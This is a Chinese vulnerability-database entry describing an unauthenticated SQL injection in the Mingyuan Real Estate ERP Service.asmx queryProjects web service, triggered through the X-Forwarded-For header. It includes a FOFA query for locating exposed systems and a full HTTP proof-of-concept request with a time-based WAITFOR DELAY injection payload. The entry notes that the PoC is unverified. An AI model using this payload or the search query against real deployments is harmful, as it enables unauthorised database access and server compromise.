---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "明源地产ERP Service.asmx queryProjects XFF SQL 注入"
product: "明源地产ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本，SQLServer"
prerequisites: "声称未认证，IP校验路径依赖"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%98%8E%E6%BA%90%E5%9C%B0%E4%BA%A7ERP%20Service.asmx%20X/%E6%98%8E%E6%BA%90%E5%9C%B0%E4%BA%A7ERP%20Service.asmx%20X-Forwarded-For%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
fofa: "body=\"/_common/scripts/md5-min.js\""
fofa_unverified: "body="
id: "vw-f76711cb0408f672f398fe0c"
entity_id: "ve-f76711cb0408f672f398fe0c"
schema_version: "1"
---

# 明源地产ERP Service.asmx queryProjects XFF SQL 注入

## 条目说明

- 对象与具体问题：明源地产ERP；Service.asmx queryProjects XFF SQLi
- 版本、配置及部署条件：无版本，SQLServer
- 认证与权限前提：声称未认证，IP校验路径依赖
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 目录被X-Forwarded-For拆名不规范，归明源地产
- Content-Length:length占位，HTTP无围栏；单5秒无基线
- 应说明IP头写SQL的根因及信任边界，不把网络可达当所有实例可用
- 在野/服务器命令后果缺条件

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

明源地产ERP系统 WebService服务针对客户端IP权限校验时,未对X-Forwarded-For获取真实IP进行严格的过滤和校验，导致出现SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## 影响版本

明源地产ERP系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/_common/scripts/md5-min.js"

POC/EXP：

```http
POST /Kfxt/Service.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
Content-Length: length
X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:5'--
SOAPAction: "http://www.mysoft.com.cn/queryProjects"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <queryProjects xmlns="http://www.mysoft.com.cn/">
      <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
    </queryProjects>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；保留原始标头；其数值未据实际请求体重新计算或验证。


![image-20250109162938910](./.resource/明源地产ERPService.asmxX-Forwarded-For注入漏洞复现/media/image-20250109162938910.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
